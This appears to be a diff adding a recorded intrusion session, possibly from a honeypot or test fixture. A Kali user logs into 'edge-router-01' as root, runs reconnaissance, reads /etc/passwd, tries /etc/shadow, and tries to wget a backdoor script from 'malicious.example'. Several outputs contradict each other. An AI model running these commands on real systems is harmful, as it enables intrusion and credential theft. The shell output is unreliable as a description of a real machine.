@@ -1,0 +1,57 @@
+kali@kali:~$ ssh root@10.47.153.65 -p 2222
+root@10.47.153.65's password: 
+
+Last login: Tue Jul 07 07:00:40 2026 from 10.47.153.112
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)
+
+root@edge-router-01:~# whoami
+root
+
+root@edge-router-01:~# id
+id: command not found
+
+root@edge-router-01:~# uname -a
+Linux edge-router-01 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux
+
+root@edge-router-01:~# hostname
+edge-router-01
+
+root@edge-router-01:~# cat /etc/os-release
+PRETTY_NAME="Ubuntu 22.04.4 LTS"
+NAME="Ubuntu"
+VERSION_ID="22.04"
+VERSION="22.04.4 LTS (Jammy Jellyfish)"
+
+root@edge-router-01:~# ls -la /root
+-rw-r--r-- 1 root     root         35 Jul 07 07:00 .bash_history
+-rw-r--r-- 1 root     root         63 Jul 07 07:00 README.txt
+
+root@edge-router-01:~# cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+
+root@edge-router-01:~# ps aux | head -8
+  PID TTY          TIME CMD
+    1 ?        00:00:03 systemd
+  721 ?        00:00:00 sshd
+ 3348 pts/0    00:00:00 bash
+ 5719 pts/0    00:00:00 ps
+
+root@edge-router-01:~# netstat -tlnp | head -6
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
+tcp        0      0 192.168.1.5:22          192.168.1.7:54012       ESTABLISHED
+
+root@edge-router-01:~# cat /etc/shadow
+cat: cannot access '/etc/shadow': No such file or directory
+
+root@edge-router-01:~# wget http://malicious.example/backdoor.sh
+wget: command not found
+
+root@edge-router-01:~# exit
+logout
+Connection to 10.47.153.65 closed.
